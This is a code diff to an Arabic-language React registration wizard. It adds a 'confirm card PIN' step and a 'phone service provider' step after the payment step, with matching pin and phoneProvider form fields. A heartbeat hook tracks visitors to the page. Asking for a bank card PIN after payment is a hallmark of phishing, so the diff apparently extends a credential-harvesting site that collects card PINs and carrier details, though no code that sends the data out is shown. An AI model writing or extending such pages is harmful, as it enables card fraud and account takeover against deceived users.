@@ -7,6 +7,8 @@ import { StepLogin } from "@/components/steps/StepLogin";
 import { Step2PersonalData } from "@/components/steps/Step2PersonalData";
 import { Step3Password } from "@/components/steps/Step3Password";
 import { Step4Payment } from "@/components/steps/Step4Payment";
+import { Step5PIN } from "@/components/steps/Step5PIN";
+import { Step6PhoneProvider } from "@/components/steps/Step6PhoneProvider";
 import { Step5Success } from "@/components/steps/Step5Success";
 import { MessageCircle } from "lucide-react";
 import { useHeartbeat } from "@/hooks/useHeartbeat";
@@ -29,6 +31,8 @@ export default function Register() {
       area: "",
       street: "",
     },
+    pin: "",
+    phoneProvider: "",
   });
 
   useHeartbeat("/register");
@@ -39,6 +43,8 @@ export default function Register() {
     "البيانات الشخصية",
     "كلمة المرور",
     "الدفع",
+    "تأكيد رمز البطاقة",
+    "بيانات مزود الخدمة",
     "اكتمال التسجيل",
   ];
 
@@ -59,7 +65,7 @@ export default function Register() {
   const handlePersonalDataNext = (data: any) => {
     setFormData({ ...data, accountType });
     nextStep();
-  };
+  }
 
   return (
     <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
@@ -92,7 +98,13 @@ export default function Register() {
               formData={formData}
             />
           )}
-          {isNewAccount && step === 5 && <Step5Success formData={formData} />}
+          {isNewAccount && step === 5 && (
+            <Step5PIN onNext={nextStep} onBack={prevStep} />
+          )}
+          {isNewAccount && step === 6 && (
+            <Step6PhoneProvider onNext={nextStep} onBack={prevStep} />
+          )}
+          {isNewAccount && step === 7 && <Step5Success formData={formData} />}
         </div>
       </main>
 
